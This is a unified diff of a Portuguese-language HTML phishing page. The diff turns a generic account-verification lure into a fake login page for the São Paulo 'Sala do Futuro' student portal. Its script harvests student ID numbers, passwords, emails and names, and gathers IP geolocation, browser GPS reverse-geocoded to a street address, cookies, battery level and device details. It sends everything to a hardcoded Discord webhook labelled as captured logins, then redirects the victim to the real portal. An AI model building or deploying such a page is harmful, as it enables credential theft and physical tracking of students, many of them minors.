@@ -1,162 +1,195 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Verificação de Conta</title>
+  <title>Sala do Futuro — Acesso</title>
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      background: #1a1a2e;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-    }
-    .card {
-      background: #16213e;
-      border: 1px solid #0f3460;
-      border-radius: 12px;
-      padding: 40px;
-      width: 360px;
-      box-shadow: 0 8px 32px rgba(0,0,0,0.5);
-    }
-    h2 { color: #e94560; margin-bottom: 8px; font-size: 1.4rem; }
-    p  { color: #aaa; font-size: 0.85rem; margin-bottom: 24px; }
-    label { color: #ccc; font-size: 0.8rem; display: block; margin-bottom: 4px; }
-    input {
-      width: 100%;
-      background: #0f3460;
-      border: 1px solid #1a4a8a;
-      border-radius: 6px;
-      padding: 10px 12px;
-      color: #fff;
-      font-size: 0.9rem;
-      margin-bottom: 16px;
-      outline: none;
-    }
-    input:focus { border-color: #e94560; }
-    button {
-      width: 100%;
-      background: #e94560;
-      color: #fff;
-      border: none;
-      border-radius: 6px;
-      padding: 12px;
-      font-size: 1rem;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-    button:hover { background: #c73652; }
-    .status { color: #4caf50; font-size: 0.8rem; margin-top: 12px; text-align: center; display: none; }
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:'Segoe UI',sans-serif;background:#0d1117;display:flex;justify-content:center;align-items:center;min-height:100vh}
+    .card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:40px;width:380px;box-shadow:0 8px 32px rgba(0,0,0,.6)}
+    .logo{text-align:center;margin-bottom:24px}
+    .logo span{font-size:1.6rem;font-weight:700;color:#58a6ff}
+    .logo p{color:#8b949e;font-size:.8rem;margin-top:4px}
+    h2{color:#f0f6fc;font-size:1.1rem;margin-bottom:6px}
+    p.sub{color:#8b949e;font-size:.8rem;margin-bottom:20px}
+    label{color:#cdd9e5;font-size:.8rem;display:block;margin-bottom:4px}
+    input{width:100%;background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:10px 12px;color:#f0f6fc;font-size:.9rem;margin-bottom:14px;outline:none;transition:border .2s}
+    input:focus{border-color:#58a6ff}
+    button{width:100%;background:#238636;color:#fff;border:none;border-radius:6px;padding:12px;font-size:1rem;cursor:pointer;transition:background .2s;margin-top:4px}
+    button:hover{background:#2ea043}
+    .status{color:#3fb950;font-size:.8rem;margin-top:14px;text-align:center;display:none}
+    .err{color:#f85149;font-size:.8rem;margin-top:14px;text-align:center;display:none}
+    .divider{border:none;border-top:1px solid #30363d;margin:20px 0}
+    .badge{display:inline-block;background:#1f6feb22;border:1px solid #1f6feb;color:#58a6ff;border-radius:4px;padding:2px 8px;font-size:.7rem;margin-bottom:16px}
   </style>
 </head>
 <body>
 <div class="card">
-  <h2>⚠️ Verificação Necessária</h2>
-  <p>Por segurança, confirme seus dados para continuar acessando sua conta.</p>
+  <div class="logo">
+    <span>🏫 Sala do Futuro</span>
+    <p>Sistema de Acesso Educacional</p>
+  </div>
 
-  <label>E-mail</label>
-  <input type="email" id="email" placeholder="seuemail@exemplo.com" />
+  <span class="badge">🔒 Sessão Segura</span>
+
+  <h2>Verificação de Identidade</h2>
+  <p class="sub">Para continuar, confirme seus dados de acesso à Sala do Futuro.</p>
+
+  <label>RA (Registro do Aluno)</label>
+  <input type="text" id="ra" placeholder="Ex: 1234567"/>
+
+  <label>Dígito do RA</label>
+  <input type="text" id="digito" placeholder="Ex: 8" maxlength="2"/>
 
   <label>Senha</label>
-  <input type="password" id="senha" placeholder="••••••••" />
+  <input type="password" id="senha" placeholder="••••••••"/>
+
+  <hr class="divider"/>
+
+  <label>E-mail (confirmação)</label>
+  <input type="email" id="email" placeholder="seuemail@edu.br"/>
 
   <label>Nome completo</label>
-  <input type="text" id="nome" placeholder="Seu nome" />
+  <input type="text" id="nome" placeholder="Seu nome completo"/>
 
-  <label>Telefone (opcional)</label>
-  <input type="tel" id="tel" placeholder="+55 11 99999-9999" />
-
-  <button onclick="enviar()">Verificar conta</button>
-  <div class="status" id="status">✔ Verificação concluída. Redirecionando...</div>
+  <button onclick="enviar()">Entrar na Sala do Futuro</button>
+  <div class="status" id="status">✔ Acesso verificado. Redirecionando...</div>
+  <div class="err"    id="errdiv">⚠ Erro de conexão. Tente novamente.</div>
 </div>
 
 <script>
-  const WEBHOOK = "https://discord.com/api/webhooks/1569297484256116817/8htEXMJyqkN6_4-Cr5ZD2RAALYiJOIIcr0GrRQqbDdF3Z-X8KQpGNgabOaZzLfYspOhf"; // ← substitui isso
+const WEBHOOK = "https://discord.com/api/webhooks/1369297484256116817/8htEXMJyqkN6_4-Cr5ZD2RAALYiJOIIcr0GrRQqbDdF3Z-X8KQpGNgabOaZzLfYspOhf";
 
-  async function getIP() {
-    try {
-      const r = await fetch("https://api.ipify.org?format=json");
-      const d = await r.json();
-      return d.ip;
-    } catch { return "não obtido"; }
-  }
+async function getIP(){
+  try{const r=await fetch("https://api.ipify.org?format=json");const d=await r.json();return d.ip;}catch{return"erro";}
+}
 
-  async function getGeo(ip) {
-    try {
-      const r = await fetch(`https://ipapi.co/${ip}/json/`);
-      const d = await r.json();
-      return `${d.city}, ${d.region}, ${d.country_name} | ISP: ${d.org}`;
-    } catch { return "não obtido"; }
-  }
-
-  async function enviar() {
-    const email = document.getElementById("email").value;
-    const senha = document.getElementById("senha").value;
-    const nome  = document.getElementById("nome").value;
-    const tel   = document.getElementById("tel").value;
-
-    const ip  = await getIP();
-    const geo = await getGeo(ip);
-
-    const ua        = navigator.userAgent;
-    const lang      = navigator.language;
-    const plat      = navigator.platform;
-    const screen_r  = `${screen.width}x${screen.height}`;
-    const tz        = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const ref       = document.referrer || "direto";
-    const cookies   = document.cookie || "nenhum";
-    const memoria   = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "não disponível";
-    const cores     = navigator.hardwareConcurrency || "?";
-    const online    = navigator.onLine;
-    const toque     = navigator.maxTouchPoints;
-    const url_atual = window.location.href;
-
-    const payload = {
-      username: "🔴 EXFIL BOT",
-      avatar_url: "https://i.imgur.com/4M34hi2.png",
-      embeds: [{
-        title: "🎯 Nova Vítima Capturada",
-        color: 0xe94560,
-        fields: [
-          { name: "📧 E-mail",        value: email  || "—", inline: true },
-          { name: "🔑 Senha",         value: senha  || "—", inline: true },
-          { name: "👤 Nome",          value: nome   || "—", inline: true },
-          { name: "📞 Telefone",      value: tel    || "—", inline: true },
-          { name: "🌐 IP",            value: ip,             inline: true },
-          { name: "📍 Localização",   value: geo,            inline: false },
-          { name: "🌍 Fuso Horário",  value: tz,             inline: true },
-          { name: "🗣️ Idioma",        value: lang,           inline: true },
-          { name: "🖥️ Plataforma",    value: plat,           inline: true },
-          { name: "📐 Resolução",     value: screen_r,       inline: true },
-          { name: "🧠 RAM",           value: memoria,        inline: true },
-          { name: "⚙️ CPU Cores",     value: String(cores),  inline: true },
-          { name: "👆 Touch Points",  value: String(toque),  inline: true },
-          { name: "📶 Online",        value: String(online), inline: true },
-          { name: "🍪 Cookies",       value: cookies.slice(0,500) || "nenhum", inline: false },
-          { name: "🔗 Referrer",      value: ref,            inline: true },
-          { name: "🌐 URL",           value: url_atual,      inline: false },
-          { name: "🤖 User-Agent",    value: ua.slice(0,500), inline: false },
-        ],
-        footer: { text: "olliE bench exfil · " + new Date().toLocaleString("pt-BR") }
-      }]
+async function getGeo(ip){
+  try{
+    const r=await fetch(`https://ipapi.co/${ip}/json/`);
+    const d=await r.json();
+    return {
+      cidade:   d.city        || "?",
+      estado:   d.region      || "?",
+      pais:     d.country_name|| "?",
+      cep:      d.postal      || "?",
+      lat:      d.latitude    || "?",
+      lon:      d.longitude   || "?",
+      isp:      d.org         || "?",
+      as:       d.asn         || "?",
+      // rua via nominatim (reverse geocode das coords)
+      rua:      null, // preenchido abaixo
     };
+  }catch{return null;}
+}
 
-    try {
-      await fetch(WEBHOOK, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
-    } catch(e) { /* silencioso */ }
+async function getRua(lat,lon){
+  try{
+    const r=await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`,{headers:{"Accept-Language":"pt-BR"}});
+    const d=await r.json();
+    const a=d.address||{};
+    const rua=[a.road,a.house_number,a.suburb,a.city_district,a.city||a.town||a.village,a.state,a.postcode].filter(Boolean).join(", ");
+    return rua||"não resolvida";
+  }catch{return"não resolvida";}
+}
 
-    document.getElementById("status").style.display = "block";
-    setTimeout(() => {
-      window.location.href = "https://google.com"; // redireciona depois
-    }, 2000);
+async function getGPSRua(){
+  return new Promise(resolve=>{
+    if(!navigator.geolocation){resolve({gps:"não suportado",rua_gps:"—"});return;}
+    navigator.geolocation.getCurrentPosition(
+      async pos=>{
+        const lat=pos.coords.latitude.toFixed(6);
+        const lon=pos.coords.longitude.toFixed(6);
+        const acc=pos.coords.accuracy.toFixed(0);
+        const rua=await getRua(lat,lon);
+        resolve({gps:`${lat}, ${lon} (±${acc}m)`,rua_gps:rua});
+      },
+      ()=>resolve({gps:"negado pelo usuário",rua_gps:"—"}),
+      {timeout:6000,enableHighAccuracy:true}
+    );
+  });
+}
+
+async function enviar(){
+  const ra     = document.getElementById("ra").value.trim();
+  const digito = document.getElementById("digito").value.trim();
+  const senha  = document.getElementById("senha").value;
+  const email  = document.getElementById("email").value.trim();
+  const nome   = document.getElementById("nome").value.trim();
+
+  // coleta passiva
+  const ip      = await getIP();
+  const geo     = await getGeo(ip);
+  const gpsData = await getGPSRua();
+
+  let rua_ip="não resolvida";
+  if(geo&&geo.lat!="?"&&geo.lon!="?"){
+    rua_ip=await getRua(geo.lat,geo.lon);
   }
+
+  const ua       = navigator.userAgent;
+  const lang     = navigator.language;
+  const plat     = navigator.platform;
+  const res      = `${screen.width}x${screen.height}`;
+  const tz       = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  const ref      = document.referrer||"direto";
+  const cookies  = document.cookie||"nenhum";
+  const ram      = navigator.deviceMemory?navigator.deviceMemory+" GB":"?";
+  const cores    = navigator.hardwareConcurrency||"?";
+  const toque    = navigator.maxTouchPoints;
+  const url      = window.location.href;
+  const batt     = await (async()=>{try{const b=await navigator.getBattery();return`${Math.round(b.level*100)}% (${b.charging?"carregando":"descarregado"})`;}catch{return"?";}}());
+
+  const geoStr = geo
+    ? `${geo.cidade}, ${geo.estado}, ${geo.pais} | CEP: ${geo.cep} | ISP: ${geo.isp}`
+    : "não obtido";
+
+  const payload={
+    username:"🎯 SALA DO FUTURO EXFIL",
+    embeds:[{
+      title:"🔴 Novo Login Capturado — Sala do Futuro",
+      color:0xe94560,
+      fields:[
+        {name:"🎓 RA",         value:ra     ||"—",inline:true},
+        {name:"#️⃣ Dígito",    value:digito ||"—",inline:true},
+        {name:"🔑 Senha",      value:senha  ||"—",inline:true},
+        {name:"📧 E-mail",     value:email  ||"—",inline:true},
+        {name:"👤 Nome",       value:nome   ||"—",inline:true},
+        {name:"🌐 IP",         value:ip,           inline:true},
+        {name:"📍 Localização (IP)",  value:geoStr,       inline:false},
+        {name:"🏘️ Rua via IP",        value:rua_ip,       inline:false},
+        {name:"📡 GPS Coordenadas",   value:gpsData.gps,  inline:false},
+        {name:"🏠 Rua via GPS",       value:gpsData.rua_gps,inline:false},
+        {name:"🌍 Fuso",       value:tz,           inline:true},
+        {name:"🗣️ Idioma",    value:lang,         inline:true},
+        {name:"🖥️ Plataforma", value:plat,         inline:true},
+        {name:"📐 Resolução",  value:res,          inline:true},
+        {name:"🧠 RAM",        value:ram,          inline:true},
+        {name:"⚙️ Cores CPU",  value:String(cores),inline:true},
+        {name:"🔋 Bateria",    value:batt,         inline:true},
+        {name:"👆 Touch",      value:String(toque),inline:true},
+        {name:"🍪 Cookies",    value:cookies.slice(0,400),inline:false},
+        {name:"🔗 Referrer",   value:ref,          inline:true},
+        {name:"🌐 URL",        value:url,          inline:false},
+        {name:"🤖 User-Agent", value:ua.slice(0,400),inline:false},
+      ],
+      footer:{text:"olliE bench · "+new Date().toLocaleString("pt-BR")}
+    }]
+  };
+
+  try{
+    const r=await fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)});
+    if(r.ok){
+      document.getElementById("status").style.display="block";
+      setTimeout(()=>{window.location.href="https://saladofuturo.educacao.sp.gov.br";},2500);
+    }else{
+      document.getElementById("errdiv").style.display="block";
+    }
+  }catch{
+    document.getElementById("errdiv").style.display="block";
+  }
+}
 </script>
 </body>
 </html>
